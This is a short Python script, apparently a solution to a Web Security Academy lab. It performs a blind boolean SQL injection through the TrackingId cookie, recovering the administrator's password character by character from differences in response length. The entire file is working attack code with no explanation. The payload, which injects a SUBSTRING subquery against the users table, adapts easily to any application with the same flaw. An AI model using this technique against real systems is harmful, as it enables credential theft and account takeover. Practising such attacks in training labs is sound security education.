import requests
import string


url = "https://0aa200910465bc97c3cdce19005c006f.web-security-academy.net/filter?category=Gifts"
headers = {
    "Host": "0aa200910465bc97c3cdce19005c006f.web-security-academy.net",
    "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0aa200910465bc97c3cdce19005c006f.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

for i in range(1, 21):
    for letter in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]:
        cookies = {
            "TrackingId": f"qyNctwBowN2e0kaF' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{letter}",
            "session": "dd4ranAnn4qgz8qcGPgZ2aIRWb1tqCLT"
        }

        # Send the request
        response = requests.get(url, headers=headers, cookies=cookies)

        # Get the response content
        content = response.content

        # Print the length of the response content
        if len(content) != 4911:
            print(f"{i}:{letter}")
